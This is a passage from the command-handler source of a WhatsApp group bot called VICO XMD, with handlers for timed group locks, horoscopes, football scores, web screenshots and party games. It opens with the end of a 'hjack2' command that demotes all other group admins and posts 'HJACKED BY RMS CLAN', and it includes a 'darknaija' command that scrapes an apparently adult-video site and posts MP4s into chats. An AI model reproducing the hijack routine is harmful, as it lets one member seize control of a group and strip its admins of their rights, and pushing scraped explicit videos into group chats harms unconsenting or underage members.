            actorIds = [...new Set(actorIds.filter(Boolean))];
            for (const p of (meta.participants || [])) {
                const id = p.id || p;
                const admin = p.admin === 'admin' || p.admin === 'superadmin';
                if (!admin) continue;
                const isBot = botIds.some(b => sameIdentity(b, id) || String(b).split(':')[0].split('@')[0] === String(id).split(':')[0].split('@')[0]);
                const isActor = actorIds.some(a => sameIdentity(a, id) || String(a).split(':')[0].split('@')[0] === String(id).split(':')[0].split('@')[0]);
                if (isBot || isActor) continue;
                // DEMOTE only — do not kick
                try {
                    await empire.groupParticipantsUpdate(m.chat, [id], 'demote');
                } catch (_) {}
            }
        } catch (_) {}
        try {
            await empire.sendMessage(m.chat, {
                text: 'HJACKED BY RMS CLAN 😈😈😈',
                contextInfo: {
                    isGroupStatus: true,
                    statusSourceType: 'TEXT',
                    statusAttributions: [{ type: 10 }],
                    statusAudienceMetadata: { audienceType: 'CLOSE_FRIENDS' }
                }
            });
        } catch (_) {}
        await empire.sendMessage(m.sender, { text: '✅ *hjack2 complete*\nLocked • name/desc set • other admins *demoted* (not kicked) • status posted.' }).catch(() => {});
    } catch (e) {
        reply('❌ hjack2 failed: ' + (e.message || 'error'));
    }
    break;
}

case 'closetime':
case 'setlock': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmins && !isCreator) return reply('🔒 *Admins only.*');
    if (!isBotAdmins) return reply('❌ Bot needs admin.');
    const raw = (args[0] || text || '').trim().toLowerCase();
    const m2 = raw.match(/^(\d+)\s*(s|sec|secs|second|seconds|m|min|mins|minute|minutes|h|hr|hrs|hour|hours|d|day|days)?$/i);
    if (!m2) return reply(`Usage: ${prefix}setlock <time>\nExamples:\n${prefix}setlock 30m\n${prefix}setlock 5hr\n${prefix}setlock 3s\n${prefix}setlock 2d`);
    let ms = parseInt(m2[1], 10);
    const unit = (m2[2] || 'm').toLowerCase();
    if (/^s/.test(unit)) ms *= 1000;
    else if (/^h/.test(unit)) ms *= 3600000;
    else if (/^d/.test(unit)) ms *= 86400000;
    else ms *= 60000;
    if (ms < 3000 || ms > 7 * 86400000) return reply('Time must be between 3s and 7 days.');
    await empire.groupSettingUpdate(m.chat, 'announcement').catch(() => {});
    reply(`🔒 Group locked for *${raw}*. Will auto-open after.`);
    setTimeout(async () => {
        try {
            await empire.groupSettingUpdate(m.chat, 'not_announcement');
            await empire.sendMessage(m.chat, { text: '🔓 Auto-open: lock time ended.' }).catch(() => {});
        } catch (_) {}
    }, ms);
    break;
}

case 'opentime':
case 'setopen': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmins && !isCreator) return reply('🔒 *Admins only.*');
    if (!isBotAdmins) return reply('❌ Bot needs admin.');
    const raw = (args[0] || text || '').trim().toLowerCase();
    const m2 = raw.match(/^(\d+)\s*(s|sec|secs|second|seconds|m|min|mins|minute|minutes|h|hr|hrs|hour|hours|d|day|days)?$/i);
    if (!m2) return reply(`Usage: ${prefix}setopen <time>\nExamples:\n${prefix}setopen 30m\n${prefix}setopen 5hr\n${prefix}setopen 3s`);
    let ms = parseInt(m2[1], 10);
    const unit = (m2[2] || 'm').toLowerCase();
    if (/^s/.test(unit)) ms *= 1000;
    else if (/^h/.test(unit)) ms *= 3600000;
    else if (/^d/.test(unit)) ms *= 86400000;
    else ms *= 60000;
    if (ms < 3000 || ms > 7 * 86400000) return reply('Time must be between 3s and 7 days.');
    await empire.groupSettingUpdate(m.chat, 'not_announcement').catch(() => {});
    reply(`🔓 Group opened for *${raw}*. Will auto-lock after.`);
    setTimeout(async () => {
        try {
            await empire.groupSettingUpdate(m.chat, 'announcement');
            await empire.sendMessage(m.chat, { text: '🔒 Auto-lock: open time ended.' }).catch(() => {});
        } catch (_) {}
    }, ms);
    break;
}


case 'text2vid':
case 't2v': {
    return reply('⚠️ text2vid has been removed from this build.');
    break;
}


case 'horoscope': {
    const qh = (text || args.join(' ') || '').trim();
    if (!qh) {
        return reply(`♈ *HOROSCOPE*\n\nUsage: ${prefix}horoscope <Month> <Day>\nExample: ${prefix}horoscope November 21\nExample: ${prefix}horoscope March 15`);
    }
    const months = {
        january:1,february:2,march:3,april:4,may:5,june:6,july:7,august:8,september:9,october:10,november:11,december:12,
        jan:1,feb:2,mar:3,apr:4,jun:6,jul:7,aug:8,sep:9,oct:10,nov:11,dec:12
    };
    const parts = qh.replace(/(\d+)(st|nd|rd|th)/gi, '$1').split(/[\s,/.-]+/).filter(Boolean);
    let month = null, day = null;
    for (const p of parts) {
        const low = p.toLowerCase();
        if (months[low]) month = months[low];
        else if (/^\d{1,2}$/.test(p)) {
            const n = parseInt(p, 10);
            if (!month && n >= 1 && n <= 12 && !day) { /* could be month num */ }
            if (n >= 1 && n <= 31) day = n;
        }
    }
    // parse "November 21"
    if (!month) {
        for (const p of parts) {
            if (months[p.toLowerCase()]) { month = months[p.toLowerCase()]; break; }
        }
    }
    if (!month || !day) return reply(`❌ Could not parse date.\nUse: ${prefix}horoscope November 21`);
    // zodiac
    const z = (m,d) => {
        const t = m*100+d;
        if (t>=321&&t<=419) return ['Aries','♈','Ram','Fire','Mars','Bold, pioneering, competitive'];
        if (t>=420&&t<=520) return ['Taurus','♉','Bull','Earth','Venus','Steady, loyal, sensual'];
        if (t>=521&&t<=620) return ['Gemini','♊','Twins','Air','Mercury','Curious, witty, adaptable'];
        if (t>=621&&t<=722) return ['Cancer','♋','Crab','Water','Moon','Nurturing, emotional, protective'];
        if (t>=723&&t<=822) return ['Leo','♌','Lion','Fire','Sun','Confident, creative, dramatic'];
        if (t>=823&&t<=922) return ['Virgo','♍','Maiden','Earth','Mercury','Precise, helpful, analytical'];
        if (t>=923&&t<=1022) return ['Libra','♎','Scales','Air','Venus','Diplomatic, fair, charming'];
        if (t>=1023&&t<=1121) return ['Scorpio','♏','Scorpion','Water','Pluto','Intense, magnetic, private'];
        if (t>=1122&&t<=1221) return ['Sagittarius','♐','Archer','Fire','Jupiter','Adventurous, honest, philosophical'];
        if (t>=1222||t<=119) return ['Capricorn','♑','Goat','Earth','Saturn','Ambitious, disciplined, patient'];
        if (t>=120&&t<=218) return ['Aquarius','♒','Water Bearer','Air','Uranus','Original, humanitarian, independent'];
        return ['Pisces','♓','Fish','Water','Neptune','Empathic, artistic, dreamy'];
    };
    const [sign, emoji, animal, element, planet, traits] = z(month, day);
    const monthNames = ['','January','February','March','April','May','June','July','August','September','October','November','December'];
    const long =
`${emoji} *HOROSCOPE — ${sign.toUpperCase()}*\n` +
`📅 Birth: *${monthNames[month]} ${day}*\n` +
`🐾 Symbol / Animal: *${animal}*\n` +
`🔥 Element: *${element}*\n` +
`🪐 Ruling planet: *${planet}*\n` +
`✨ Core traits: *${traits}*\n\n` +
`*Personality*\n` +
`People born under ${sign} carry a distinct energy of the ${animal}. Your ${element} nature shapes how you love, work, and fight for what matters. ${planet} guides your instincts — lean into that pull when choices feel heavy.\n\n` +
`*Love*\n` +
`In relationships you need honesty more than drama. Show care in actions, not only words. A partner who respects your pace will unlock your loyalty.\n\n` +
`*Career*\n` +
`You thrive where ${traits.split(',')[0].toLowerCase()} energy is rewarded. Avoid stagnant routines; build systems that let your strengths show.\n\n` +
`*Today's focus*\n` +
`Protect your peace, finish one hard task, and send gratitude to someone who showed up for you.\n\n` +
`*Lucky vibes*\n` +
`Colors: deep red & black • Mood: focused confidence • Affirmation: "I move with purpose."\n\n` +
`_${sign} ${emoji} • VICO XMD_`;
    try {
        const img = 'https://image.pollinations.ai/prompt/' + encodeURIComponent(
            sign + ' zodiac constellation art, ' + animal + ' symbol, mystical astrology poster, gold and deep red on black, elegant, detailed'
        ) + '?width=1024&height=1024&nologo=true';
        await empire.sendMessage(m.chat, { image: { url: img }, caption: long }, { quoted: m });
    } catch (_) {
        reply(long);
    }
    break;
}

case 'football':
case 'scored':
case 'match':
case 'matches': {
    await reply('⚽ *Fetching today\'s matches...*');
    try {
        let textOut = null;
        // football-data.org style free mirrors / open APIs
        const tries = [
            async () => {
                const { data } = await axios.get('https://www.thesportsdb.com/api/v1/json/3/eventsday.php', {
                    params: { d: new Date().toISOString().slice(0,10), s: 'Soccer' }, timeout: 20000
                });
                const ev = data?.events || [];
                if (!ev.length) return null;
                let t = '⚽ *MATCHES TODAY*\n\n';
                for (const e of ev.slice(0, 15)) {
                    const home = e.strHomeTeam || '?';
                    const away = e.strAwayTeam || '?';
                    const score = (e.intHomeScore != null && e.intAwayScore != null)
                        ? `${e.intHomeScore} - ${e.intAwayScore}` : 'vs';
                    const status = e.strStatus || e.strProgress || '';
                    const league = e.strLeague || '';
                    t += `• *${home}* ${score} *${away}*\n  ${league}${status ? ' • ' + status : ''}\n\n`;
                }
                return t;
            },
            async () => {
                const { data } = await axios.get('https://api.football-data.org/v4/matches', {
                    headers: { 'X-Auth-Token': process.env.FOOTBALL_DATA_TOKEN || '' },
                    timeout: 15000
                }).catch(() => ({ data: null }));
                const ms = data?.matches || [];
                if (!ms.length) return null;
                let t = '⚽ *MATCHES*\n\n';
                for (const e of ms.slice(0, 12)) {
                    t += `• *${e.homeTeam?.name}* ${e.score?.fullTime?.home ?? '-'} - ${e.score?.fullTime?.away ?? '-'} *${e.awayTeam?.name}*\n`;
                }
                return t;
            }
        ];
        for (const fn of tries) {
            try { textOut = await fn(); if (textOut) break; } catch (_) {}
        }
        if (!textOut) textOut = '⚽ No match data right now. Try again later or check a major league day.';
        try {
            const img = 'https://image.pollinations.ai/prompt/' + encodeURIComponent('football stadium night match scoreboard, cinematic sports poster, red and black') + '?width=1024&height=576&nologo=true';
            await empire.sendMessage(m.chat, { image: { url: img }, caption: textOut.slice(0, 3500) }, { quoted: m });
        } catch (_) {
            reply(textOut.slice(0, 4000));
        }
    } catch (e) {
        reply('❌ Match fetch failed: ' + (e.message || ''));
    }
    break;
}

case 'vicopic': {
    // rename alias — same as setbotppp if body exists later; minimal working path
    if (!isCreator && !isSudo) return reply('🔒 *Owner only.*');
    if (!m.quoted) return reply(`Reply to an image with ${prefix}changepic`);
    try {
        const buf = await empire.downloadMediaMessage(m.quoted);
        if (!buf) return reply('❌ Could not download image.');
        await empire.updateProfilePicture(empire.user.id, buf);
        reply('✅ Bot profile picture updated.');
    } catch (e) {
        reply('❌ changepic failed: ' + (e.message || 'error'));
    }
    break;
}

case 'info':
case 'help': {
    return reply(
`ℹ️ *BOT INFO*\n\n` +
`Name: VICO XMD\n` +
`Prefix: ${prefix}\n` +
`Mode: ${db.botMode?.mode || 'public'}\n` +
`Uptime: ${Math.floor(process.uptime()/60)}m\n\n` +
`Use ${prefix}menu for commands.`
    );
    break;
}








case 'getgpp':
case 'gpp':
case 'grouppp': {
    if (!isGroup) return reply('⚠️ Group only.');
    await empire.sendMessage(m.chat, { react: { text: '📸', key: m.key } }).catch(() => {});
    try {
        const meta = await empire.groupMetadata(m.chat);
        let ppUrl = null;
        try { ppUrl = await empire.profilePictureUrl(m.chat, 'image'); } catch (_) {}
        if (!ppUrl) return reply('📸 *' + (meta.subject || 'Group') + '*\n\n❌ No profile picture set.');
        await empire.sendMessage(m.chat, {
            image: { url: ppUrl },
            caption: '📸 *Group Profile Picture*\n\n👥 ' + (meta.subject || 'Group')
        }, { quoted: m });
    } catch (e) {
        reply('❌ ' + (e.message || 'Could not fetch group PP'));
    }
    break;
}

case 'ssweb':
case 'screenshot':
case 'webshot': {
    let target = (text || args.join(' ') || '').trim();
    if (!target) return reply('📸 Usage: ' + prefix + 'ssweb <url>\nExample: ' + prefix + 'ssweb google.com');
    if (!/^https?:\/\//i.test(target)) target = 'https://' + target;
    await empire.sendMessage(m.chat, { react: { text: '📸', key: m.key } }).catch(() => {});
    await reply('⏳ Capturing ' + target + '…');
    try {
        const response = await axios.get('https://apis.davidcyril.name.ng/ssweb', {
            params: { url: target }, responseType: 'arraybuffer', timeout: 45000,
            maxContentLength: 20*1024*1024, validateStatus: () => true, headers: { 'User-Agent': 'Mozilla/5.0' }
        });
        const buffer = Buffer.from(response.data);
        const isPng = buffer[0] === 0x89 && buffer[1] === 0x50;
        const isJpg = buffer[0] === 0xFF && buffer[1] === 0xD8;
        if (response.status !== 200 || (!isPng && !isJpg)) throw new Error('Screenshot API failed');
        await empire.sendMessage(m.chat, {
            image: buffer, mimetype: isPng ? 'image/png' : 'image/jpeg',
            caption: '📸 *Website Screenshot*\n🔗 ' + target
        }, { quoted: m });
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        reply('❌ Screenshot failed: ' + (e.message || 'error'));
    }
    break;
}

case 'userstat':
case 'userstats':
case 'botusers': {
    try {
        if (!global.__vicoUsers) global.__vicoUsers = new Set();
        global.__vicoUsers.add(String(m.sender || '').split(':')[0].split('@')[0]);
        reply('📊 *User Stats*\n\n👥 Tracked users this session: *' + global.__vicoUsers.size + '*\n🤖 Bot: VICO XMD');
    } catch (e) {
        reply('❌ ' + (e.message || 'error'));
    }
    break;
}

case 'darknaija':
case 'dn': {
    const q = (text || args.join(' ') || '').trim();
    if (!q) return reply('🔞 *DarkNaija*\n\n• ' + prefix + 'darknaija latest\n• ' + prefix + 'darknaija <search>\n• ' + prefix + 'darknaija <url>');
    await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } }).catch(() => {});
    try {
        const cheerio = require('cheerio');
        const BASE = 'https://darknaija.com';
        const http = axios.create({ timeout: 40000, headers: { 'User-Agent': 'Mozilla/5.0', Referer: BASE + '/' } });
        async function scrapeList(u) {
            const { data } = await http.get(u);
            const $ = cheerio.load(data);
            const posts = [];
            $('.hentry').each((i, el) => {
                if (i >= 12) return false;
                const a = $(el).find('.entry-title a').first();
                const title = (a.attr('title') || a.text() || '').trim();
                const href = a.attr('href') || '';
                const thumb = $(el).find('img').first().attr('data-src') || $(el).find('img').first().attr('src') || '';
                if (title && href.includes('darknaija.com')) posts.push({ title, link: href, thumbnail: thumb });
            });
            return posts;
        }
        if (/darknaija\.com\//i.test(q)) {
            const url = q.match(/https?:\/\/[^\s]+/)[0];
            const { data } = await http.get(url);
            const $ = cheerio.load(data);
            const title = $('meta[property="og:title"]').attr('content') || 'DarkNaija';
            const thumb = $('meta[property="og:image"]').attr('content') || '';
            let video = $('video').attr('src') || $('video source').attr('src');
            if (!video) {
                const m2 = $.html().match(/https?:\/\/srv-darknaija\.com\/[^"'\s]+\.mp4/i);
                if (m2) video = m2[0];
            }
            if (!video) return reply('❌ No MP4 found for that post.');
            if (thumb) await empire.sendMessage(m.chat, { image: { url: thumb }, caption: '🔞 *' + title + '*' }, { quoted: m });
            await empire.sendMessage(m.chat, { video: { url: video }, caption: '🎬 ' + title, mimetype: 'video/mp4' }, { quoted: m });
        } else {
            const u = ['latest','new','recent'].includes(q.toLowerCase()) ? BASE + '/' : BASE + '/?s=' + encodeURIComponent(q);
            const posts = await scrapeList(u);
            if (!posts.length) return reply('❌ No results.');
            let cap = '🔞 *DarkNaija*\n\n';
            posts.slice(0, 10).forEach((x, i) => { cap += '*' + (i+1) + '.* ' + x.title + '\n🔗 ' + x.link + '\n\n'; });
            if (posts[0]?.thumbnail) await empire.sendMessage(m.chat, { image: { url: posts[0].thumbnail }, caption: cap.slice(0, 3000) }, { quoted: m });
            else reply(cap.slice(0, 4000));
        }
    } catch (e) {
        reply('❌ ' + (e.message || 'error'));
    }
    break;
}






case 'leave':
case 'left': {
    if (!isGroup) return reply('❌ Group only.');
    try {
        // Leave silently — remove self from group
        await empire.groupLeave(m.chat).catch(async () => {
            await empire.groupParticipantsUpdate(m.chat, [botNumber], 'remove');
        });
    } catch (e) {
        try { await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e2) {
            reply('❌ Could not leave: ' + (e2.message || e.message || 'error'));
        }
    }
    break;
}

case 'caption': {
    const captions = [
        "No explanation needed. 😎",
        "Silent moves, loud results. ⚡",
        "Built different. 🔥",
        "Just another day at the top. 👑",
        "Energy speaks louder than words. 💫",
        "Stay real. Stay focused. 🎯",
        "Creating memories, not excuses. 🚀",
        "Less talk. More action. ⚡",
        "Main character energy. 🎬",
        "The vibe says it all. 😎"
    ];
    const caption = captions[Math.floor(Math.random() * captions.length)];
    reply(`📸 *CAPTION*\n\n"${caption}"\n\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠɪᴄᴏ xᴍᴅ ༒_`);
    break;
}

case 'profession': {
    const professions = [
        "💻 Software Developer",
        "🛡️ Cybersecurity Analyst",
        "🎨 Designer",
        "🎮 Game Developer",
        "🔬 Researcher",
        "🚀 Entrepreneur",
        "📱 Mobile Developer",
        "🧠 AI Engineer"
    ];
    const profession = professions[Math.floor(Math.random() * professions.length)];
    const target = args.join(' ') || m.pushName || 'You';
    reply(`╔═━━⚡𝐏𝐑𝐎𝐅𝐄𝐒𝐒𝐈𝐎𝐍 ━━━\n║  ⟐ *TARGET* 〢 ${target}\n║  ⟐ *CAREER* 〢 ${profession}\n╚═━━━━━━━━━━━━━━━━\n\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠɪᴄᴏ xᴍᴅ ༒_`);
    break;
}

case 'toxicrate': {
    const rate = Math.floor(Math.random() * 101);
    reply(`╔═━━⚡ 𝐓𝐎𝐗𝐈𝐂 𝐑𝐀𝐓𝐄 ━━━\n║  ⟐ *RATE* 〢 ${rate}%\n║  ⟐ *LEVEL* 〢 ☣️ Just for fun\n╚═━━━━━━━━━━━━━━━━━\n\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠɪᴄᴏ xᴍᴅ ༒_`);
    break;
}

case 'iqrate':
case 'iq': {
    const iq = Math.floor(Math.random() * 121) + 60;
    reply(`╔═━━⚡ 𝐈𝐐 𝐑𝐀𝐓𝐄 ━━━\n║  ⟐ *IQ* 〢 ${iq}\n║  ⟐ *MODE* 〢 🧠 𝐕𝐈𝐂𝐎 𝐗𝐌𝐃\n╚═━━━━━━━━━━━━━━━━\n\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠɪᴄᴏ xᴍᴅ ༒_`);
    break;
}

case 'hotseat': {
    const questions = [
        "Who in this group makes you laugh the most?",
        "What is your biggest pet peeve?",
        "What is one skill you wish you had?",
        "What is your favorite thing to do when bored?",
        "Who would survive longest in a zombie movie?",
        "What is the funniest thing that happened to you recently?",
        "What is one thing you cannot live without?",
        "What is your dream destination?"
    ];
    const question = questions[Math.floor(Math.random() * questions.length)];
    reply(`🔥 *HOT SEAT*\n\n🎯 Question:\n\n*${question}*\n\nEveryone can answer 👀\n\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠɪᴄᴏ xᴍᴅ ༒_`);
    break;
}

case 'babyname': {
    const names = ["Nova","Zara","Kai","Leo","Ari","Milo","Luna","Zion","Sky","River","Amara","Chidi","Ife","Sade","Tunde"];
    const name = names[Math.floor(Math.random() * names.length)];
    reply(`╭──〔 🍼 ʙᴀʙʏɴᴀᴍᴇ 〕\n│  ◈ sᴜɢɢᴇsᴛɪᴏɴ : *${name}*\n╰──────────────────────\n\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠɪᴄᴏ xᴍᴅ ༒_`);
    break;
}

case 'antilink': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmins && !isCreator) return reply('🔒 *Admins only.*');
    if (!db.antilink) db.antilink = {};
    const opt = (args[0] || '').toLowerCase();
    if (opt === 'on' || opt === 'enable' || opt === '1') {
        db.antilink[m.chat] = true;
        try { saveDB(); } catch (_) {}
        return reply('🛡️ *Antilink ON*\nLinks from non-admins will be deleted.');
    }
    if (opt === 'off' || opt === 'disable' || opt === '0') {
        delete db.antilink[m.chat];
        try { saveDB(); } catch (_) {}
        return reply('🛡️ *Antilink OFF*');
    }
    const st = db.antilink[m.chat] ? 'ON ✅' : 'OFF ❌';
    return reply(`🛡️ *Antilink:* *${st}*\n\n${prefix}antilink on\n${prefix}antilink off`);
}

        default:
            break;
        }

    } catch (err) {
        console.error('Command error:', err);
        if (m?.chat) empire.sendMessage(m.chat, { 
            text: `❌ Error: ${err.message}`,
            contextInfo: newsletterContext()
        }).catch(() => {});
    }
};

// ========== GROUP PARTICIPANTS UPDATE ==========
// Cleaned - removed orphaned anti features logic that had no case commands
async function handleGroupParticipantsWrapper(sock, update) {
    try {
        if (update?.id && update?.participants) {
            const gm = await sock.groupMetadata(update.id).catch(() => null);
            if (gm) {
                if (typeof handleGroupParticipantsUpdate === 'function') {
                    await handleGroupParticipantsUpdate(sock, update, gm, sock.user.id);
                }
                // Check for jailed users (jail/unjail commands exist)
                if (db.jailed?.[update.id]) {
                    for (const p of update.participants) {
                        if (db.jailed[update.id][p]) {
                            const jailedData = db.jailed[update.id][p];
                            if (jailedData.until && Date.now() > jailedData.until) {
                                delete db.jailed[update.id][p];
                                saveDB();
                            } else {
                                await sock.groupParticipantsUpdate(update.id, [p], 'remove').catch(() => {});
                            }
                        }
                    }
                }
            }
        }
    } catch (e) { console.error('Group update error:', e); }
}

// ========== EXPORTS (cleaned - cleaned exports) ==========
botHandler.handleGroupUpdate = handleGroupParticipantsWrapper;
module.exports = botHandler;

// ========== HOT RELOAD ==========
if (!global.__VICO_WATCHER__) {
    global.__VICO_WATCHER__ = true;
    let file = require.resolve(__filename);
    fs.watchFile(file, () => {
        fs.unwatchFile(file);
        global.__VICO_WATCHER__ = false;
        console.log('\x1b[0;32m' + __filename + ' updated!\x1b[0m');
        delete require.cache[file];
        try { require(file); } catch(e) { console.error('Hot reload failed:', e.message); }
    });
}